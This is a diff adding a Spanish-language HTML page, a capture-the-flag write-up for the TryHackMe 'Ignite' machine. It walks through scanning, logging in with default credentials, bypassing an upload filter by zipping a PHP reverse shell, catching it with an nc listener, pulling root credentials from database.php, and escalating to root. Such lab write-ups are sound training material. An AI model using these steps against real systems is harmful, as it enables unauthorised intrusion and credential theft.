@@ -1,0 +1,98 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Ignite | Writeup TryHackMe</title>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+  <style>
+    :root {
+      --bg: #0b1e2d;
+      --text: #e8f1f8;
+      --muted: #94a3b8;
+      --primary: #38bdf8;
+      --panel: rgba(18, 39, 56, 0.85);
+      --border: #1e3a4c;
+    }
+
+    body {
+      background-color: var(--bg);
+      color: var(--text);
+      font-family: 'Inter', sans-serif;
+      padding: 2rem;
+      line-height: 1.6;
+    }
+
+    h1, h2 {
+      color: var(--primary);
+      margin-bottom: 0.5rem;
+    }
+
+    pre {
+      background: var(--panel);
+      border: 1px solid var(--border);
+      padding: 1rem;
+      overflow-x: auto;
+      border-radius: 0.5rem;
+      margin-bottom: 1.5rem;
+    }
+
+    code {
+      font-family: monospace;
+    }
+
+    .muted {
+      color: var(--muted);
+    }
+  </style>
+</head>
+<body>
+  <h1>Writeup: Ignite (TryHackMe)</h1>
+  <p class="muted">Autor: h4cksito | Nivel: Fácil | Plataforma: TryHackMe</p>
+
+  <h2>Enumeration</h2>
+  <p>Como siempre, lo primero que haremos será un escaneo para ver qué es lo que tenemos delante. En este caso, como se trata de una máquina sencilla, basta con hacer un <code>nmap</code> básico:</p>
+  <pre><code>nmap -sS -sV 10.10.100.155
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</code></pre>
+  <p>Como podéis observar, lo único que sacamos es un puerto abierto: 80 (HTTP).</p>
+  <p>Entramos en la web, vemos unas instrucciones básicas y nos dan un login para acceder al panel del administrador: <strong>admin:admin</strong>.</p>
+
+  <h2>Exploitation</h2>
+  <p>Dentro del panel de administración, exploramos todo. En la sección <strong>Assets</strong> podemos subir archivos. Al intentar subir directamente una reverse shell en PHP, falla por formato. Sin embargo, se permite subir archivos <code>.zip</code> y descomprimirlos automáticamente…</p>
+  <p>Subimos la reverse shell dentro de un ZIP y marcamos la casilla de descompresión. ¡Funciona!</p>
+
+  <h2>Reverse Shell</h2>
+  <p>La reverse shell usada es la clásica de pentestmonkey (<a href="https://github.com/pentestmonkey/php-reverse-shell">link</a>). Configuramos nuestra IP y puerto:</p>
+  <pre><code>nc -lvnp 4444
+listening on [any] 4444 ...</code></pre>
+  <p>Hacemos clic en la shell desde el panel y… ¡acceso como <code>www-data</code>!</p>
+
+  <h2>User conseguido</h2>
+  <pre><code>cat home/www-data/flag.txt</code></pre>
+
+  <h2>Privilege Escalation</h2>
+  <p>Buscamos binarios SUID:</p>
+  <pre><code>find / -perm -u=s -type f 2>/dev/null</code></pre>
+  <p>También se puede usar <code>suid3num.py</code> para automatizarlo. No encontramos nada útil.</p>
+
+  <p>Recordamos un archivo <code>database.php</code> mencionado en la web. Lo localizamos y encontramos credenciales:</p>
+  <pre><code>'username' => 'root',
+'password' => '******',</code></pre>
+
+  <p>Probamos con <code>su root</code>, pero da error (no es terminal real). Solución:</p>
+  <pre><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></pre>
+  <p>Ahora sí:</p>
+  <pre><code>su root
+Password: ******
+# id
+uid=0(root) gid=0(root) groups=0(root)</code></pre>
+
+  <h2>Root conseguido</h2>
+  <pre><code>cat /root/root.txt</code></pre>
+
+  <h2>Conclusión</h2>
+  <p>Una máquina sencilla pero útil para practicar subida de archivos y escalada básica. La clave fue pensar en la descompresión automática del ZIP para bypassear la validación del upload. Buen ejercicio de lógica hacker 🧠</p>
+</body>
+</html>
